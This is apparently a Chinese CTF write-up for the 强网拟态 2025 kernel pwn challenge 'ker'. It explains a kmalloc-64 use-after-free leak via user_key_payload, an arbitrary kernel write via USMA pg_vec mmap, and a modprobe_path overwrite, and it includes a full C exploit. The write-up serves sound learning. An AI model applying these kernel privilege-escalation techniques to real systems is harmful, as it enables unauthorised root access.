---
date: 2025-01-24 10:29:07
layout: post
title: 强网拟态 2025 初赛 ker writeup
subtitle: 
description: >-
    user_key_payload, USMA and a lot of thoughts
image: >-
  /assets/img/uploads/ker.png
optimized_image: >-
  /assets/img/uploads/ker.png
category: ctf
tags:
  - kernel pwn
  - user_key_payload
  - USMA
  - pg_vec
  - kmalloc-64
  - modprobe_path
author: rosayxy
paginate: true
---
这道题感觉非常耗脑子啊... 也是当时我们唯一没做出来的 pwn 题hhh (还记得队友那道 shellcode 题做到了凌晨5点，有被狠狠卷到（笑)        
也是一次性的学了 user_key_payload 和 USMA 的利用，但是这个整体的利用思路感觉可能对我来说还是有点难想到吧（学到是学了，但是不知道有没有学会...可能眼睛学会了？（心虚））     

## 漏洞
一个 UAF 洞，好像 kernel 题比较多的还是 UAF...   
但是限制比较多，只能申请一次，是 kmalloc-64，有两次 free 这个 chunk 的机会，可以改这个 chunk 的前 0x8 个字节      
## 思路
对于 kmalloc-64，可以用的结构体只有 msg_msg，user_key_payload 和 setxattr，在这里我们用 user_key_payload 进行利用      
其中，msg_msg的申请带了 GFP_KERNEL_ACCOUNT 标志，而我们申请内存是 `kmalloc_trace(kmalloc_caches[6], 0xCC0LL, 0x28LL);`    
其中 GFP_KERNEL_ACCOUNT 定义为 `#define GFP_KERNEL_ACCOUNT (GFP_KERNEL | __GFP_ACCOUNT)`，我们申请显然没带该标志，所以申请出来的堆是隔离开的     
### leak
user_key_payload 的两大作用分别如下：   
1. 大量申请 user_key_payload 然后 revoke，他会调用析构函数，但是申请出来的堆块 free 的时候，堆上还会残留内核地址，从而达到 **堆喷内核地址** 的作用
2. 如果有 UAF 可以改掉 user_key_payload 的长度字段的话，可以**内核堆越界读**，这个和 msg_msg 的用法也有点类似
所以常常**这两点结合来 leak 内核地址**     
我们期望先用 user_key_payload 占住堆内存，但是因为只能修改前 0x8 字节，所以改不到我们的 len 字段     
于是我们再 free 一次，用 USMA 中的 pg_vec 占住堆块，此时相当于是一个 pg_vec 的块和一个 user_key_payload 字段重合，该堆块被覆盖为一个个虚拟页的地址，而 user_key_payload 的 size 字段是 offset 0x10 开始的两个字节，有较大概率已经被覆盖为一个较大的数，结合堆喷的内核地址，可以进行泄露     
如果单独从 leak 这步讲，更方便的方法无疑是在再 free 一次之后用 setxattr 申请出来改 len，但是之后很难结合 edit 进行利用      
对于 user_key_payload 的申请长度，调用 add_key syscall 时，内核根据 payload_len 会有两次内存申请。第一次申请长度为 payload_len，第二次在 user_preparse() 函数中，申请长度为 payload_len + 0x18 来放 struct user_key_payload 结构体     
### arbituary write
用 USMA 的方法进行 arbitrary write，这个故事是这样的    
1. 是用的 packet_socket 的板子进行堆申请和地址 mmap，参考 [这篇文章](https://vul.360.net/archives/391)     
> 为了加速数据在用户态和内核态的传输，packet socket可以创建一个共享环形缓冲区，这个环形缓冲区通过alloc_pg_vec()创建    
> 可以看到pg_vec实际上是一个保存着连续物理页的虚拟地址的数组，而这些虚拟地址会被packet_mmap()函数所使用，packet_mmap()将这些内核虚拟地址代表的物理页映射进用户态（行4502）
而调用 mmap 传入的 fd 参数为 socket 返回的文件描述符时，则会调用 packet_mmap 进行映射     
所以不难想到，如果我们改该 pg_vec 中的虚拟地址为想去写的内核地址，则调用 mmap 时，就会存在我们的目标内核地址又被映射到用户态，从而**我们在用户态正大光明的写该 mmap 返回的地址，同时就会改到目标内核态地址** （感觉这一步让我想到了前些天见到的 Windows MmMapIoSpace abuse (cve-2021-33104) 但是原理并不相同）          
2. 这样就存在一个问题：我们 alloc_pg_vec() 时，申请的堆大小是否可控？能否申请到我们的 kmalloc-64 堆块？     
答案是可以的，详见 [学姐的博客](https://blingblingxuanxuan.github.io/2023/04/01/230401-n1ctf2022-pwn-praymoon/) ，在 alloc_pg_vec 中，根据用户态传入的block_nr，申请block_nr*8大小的内存     
所以思路是我们申请 packet_socket，然后用 UAF edit 前8字节的方法改掉其中某个页的起始地址为某内核 0x1000 对齐的地址，接着 mmap 出来，就能达到 "我们在用户态正大光明的写该 mmap 返回的地址，同时就会改到目标内核态地址" 的效果      
然后亲试，该步需要堆喷     
### cat flag
用 modprobe_path 把内核任意地址写转为 cat flag，详见 [这篇博客](/_posts/2025-01-20-still-userfaultfd.md)       

## exp
```c
#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdlib.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <linux/keyctl.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <sched.h>
#define KEY_SPEC_PROCESS_KEYRING -2 /* - key ID for process-specific keyring */
#define KEYCTL_UPDATE           2   /* update a key */
#define KEYCTL_REVOKE           3   /* revoke a key */
#define KEYCTL_UNLINK           9   /* unlink a key from a keyring */
#define KEYCTL_READ             11  /* read a key or keyring's contents */
#define HEAP_SPRAY_COUNT 200

size_t kernel_offset,kernel_base;
size_t user_cs, user_rflags, user_sp, user_ss;
int f1;
char c[48];
void** ptr;
char tmp_x[0x10];
unsigned long long tmp_buf[0x10];
char tmp_buf1[0xb010];
int test_id[HEAP_SPRAY_COUNT+0x10];
size_t page_addresses[216];
// vuln driver operations
void delete(void** ptr){
    ioctl(f1,48,ptr);
}
void edit(void** ptr){
    ioctl(f1,80,ptr);
}
void create(void** ptr){
    ioctl(f1,32,ptr);
}
// user key payload operations 
int key_alloc(char *description, void *payload, size_t plen)
{
    return syscall(__NR_add_key, "user", description, payload, plen, 
                   KEY_SPEC_PROCESS_KEYRING);
}

int key_update(int keyid, void *payload, size_t plen)
{
    return syscall(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);
}

int key_read(int keyid, void *buffer, size_t buflen)
{
    return syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);
}

int key_revoke(int keyid)
{
    return syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, 0, 0, 0);
}

int key_unlink(int keyid)
{
    return syscall(__NR_keyctl, KEYCTL_UNLINK, keyid, KEY_SPEC_PROCESS_KEYRING);
}
// common functions
void save_status(void)
{
    asm volatile ("mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );

    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
}
void get_flag(){
    system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");
    system("/tmp/dummy");
    sleep(0.3);
    system("cat flag");
    exit(0);
}
#ifndef ETH_P_ALL
#define ETH_P_ALL 0x0003
#endif
void die(const char *msg) {
    perror(msg);
    exit(1);
}
// ------------------- USMA 板子 start -------------------
void packet_socket_rx_ring_init(int s, unsigned int block_size,
                                unsigned int frame_size, unsigned int block_nr,
                                unsigned int sizeof_priv, unsigned int timeout) {
    int v = TPACKET_V3;
    int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
    if (rv < 0) {
        die("setsockopt(PACKET_VERSION): %m");
    }

    struct tpacket_req3 req;
    memset(&req, 0, sizeof(req));
    req.tp_block_size = block_size;
    req.tp_frame_size = frame_size;
    req.tp_block_nr = block_nr;
    req.tp_frame_nr = (block_size * block_nr) / frame_size;
    req.tp_retire_blk_tov = timeout;
    req.tp_sizeof_priv = sizeof_priv;
    req.tp_feature_req_word = 0;

    rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
    if (rv < 0) {
        die("setsockopt(PACKET_RX_RING): %m");
    }
}
void unshare_setup(void)                  
{                  
    char edit[0x100];                  
    int tmp_fd;                  
                 
    if(unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET)) {                 
        puts("FAILED to create a new namespace"); 
        exit(-1);
    }                 
                 
    tmp_fd = open("/proc/self/setgroups", O_WRONLY);                  
    write(tmp_fd, "deny", strlen("deny"));                  
    close(tmp_fd);                  
                 
    tmp_fd = open("/proc/self/uid_map", O_WRONLY);                  
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());                  
    write(tmp_fd, edit, strlen(edit));                  
    close(tmp_fd);                  
                 
    tmp_fd = open("/proc/self/gid_map", O_WRONLY);                  
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());                  
    write(tmp_fd, edit, strlen(edit));                  
    close(tmp_fd);                  
}  

int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
                        unsigned int block_nr, unsigned int sizeof_priv, int timeout) {
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (s < 0) {
        die("socket(AF_PACKET): %m");
    }

    packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,
                               sizeof_priv, timeout);

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = PF_PACKET;
    sa.sll_protocol = htons(ETH_P_ALL);
    sa.sll_ifindex = if_nametoindex("lo");
    sa.sll_hatype = 0;
    sa.sll_pkttype = 0;
    sa.sll_halen = 0;

    int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
    if (rv < 0) {
        die("bind(AF_PACKET): %m");
    }

    return s;
}

int pagealloc_pad(int count, int size) {
    return packet_socket_setup(size, 2048, count, 0, 100);
}
// ------------------- USMA 板子 end -------------------

int main(){
    bind_core(0);
    unshare_setup(); // need to call this or socket(AF_PACKET) will fail
    save_status();
    f1 = open("/dev/ker",2);
    *(long long*)c = c + 1;
    create(c);
    delete(c);
    int payload_size = 0x1f;
    char payload[0x1f] = {0};
    // spray: step 1
    int i = 0;
    int occupy_idx = 0;
    srand((unsigned)time(NULL));
    char * tmp_desc = (char*)malloc(20);
    memset(tmp_desc, 0, 20);
    for(i =0; i < HEAP_SPRAY_COUNT; i++){
        snprintf(tmp_desc, 20, "a%x", rand());
        test_id[i] = key_alloc(tmp_desc,payload,payload_size);
    }
   // free again 
    delete(c);
    // do usma, occupy the chunk again with kernel addresses
    int pfds[200];
    for(i = 0; i < 200; i++){
        pfds[i] = pagealloc_pad(8, 0x1000);
        if(pfds[i] < 0){
            perror("pfds");
            break;
        }
    }
    // address leak with key_read with user_key_payload
    // get the one who occupies the chunk
    for(i = 0; i < HEAP_SPRAY_COUNT; i++){
        if(key_read(test_id[i], tmp_buf1, 0xb000) > 0x28){
            occupy_idx = i;
            break;
        }
    }
    printf("occupy_idx: %d\n",occupy_idx);
    // **need to revoke all the other keys to spray kernel address on kernel heap first!**
    for(i = 0; i < HEAP_SPRAY_COUNT; i++){
        if(i == occupy_idx) continue;
        key_revoke(test_id[i]);
    }
    key_read(test_id[occupy_idx], tmp_buf1, 0xb000);
    // get the kernel address from tmp_buf1
    // get the first address starting at 0x850
    // 0xffffffffa4408850 0xffffffffa3e00000
    for(int i=0;i<0xb000/8;i++){
        if(((unsigned long long*)tmp_buf1)[i] > 0xffffffff00000000ull){
            printf("leak: %p at offset %d\n", ((long long*)tmp_buf1)[i],i);
            printf("offset: %p\n",(((long long*)tmp_buf1)[i] & 0xfff ));
            if((((long long*)tmp_buf1)[i] & 0xfff )== 0x850){
                printf("find kernel base!\n");
                kernel_base = ((unsigned long long*)tmp_buf1)[i] - 0x4408850 + 0x3e00000;
                kernel_offset = kernel_base - 0xFFFFFFFF81000000;
                break;
            }
        }
    }
    printf("kernel_base = %p\n",kernel_base);
    printf("kernel offset = %p\n",kernel_offset);
    size_t modprobe_path = 0xFFFFFFFF831D8CE0 + kernel_offset;
    size_t modprobe_path_page = modprobe_path & 0xfffffffffffff000;
    size_t address = &modprobe_path_page;
    edit(&address);
    // mmap a lot, have to spray or will fail
    for(int i=0;i<200;i++){
        page_addresses[i] = (size_t)mmap(0,0x1000*8,PROT_READ|PROT_WRITE,MAP_SHARED,pfds[i],0);
    }
    memcpy(tmp_x,"/tmp/x",0x10);
    for (int i = 0; i < 200; i++){
        memcpy((void*)page_addresses[i] + 0xce0,tmp_x,0x10); // edit the kernel address at the same time
    }
    // trigger
    get_flag();
    return 0;
}

```

## 总结
可以 mark 一下这个任意写的方法 ~    
快春节了，新年快乐吖 ~  
## reference
总体思路参考较多：https://www.ctfiot.com/211007.html     
https://vul.360.net/archives/391     
https://blingblingxuanxuan.github.io/2023/02/06/230206-rwctf2023-digging-into-kernel-3/     
https://blingblingxuanxuan.github.io/2023/04/01/230401-n1ctf2022-pwn-praymoon/      
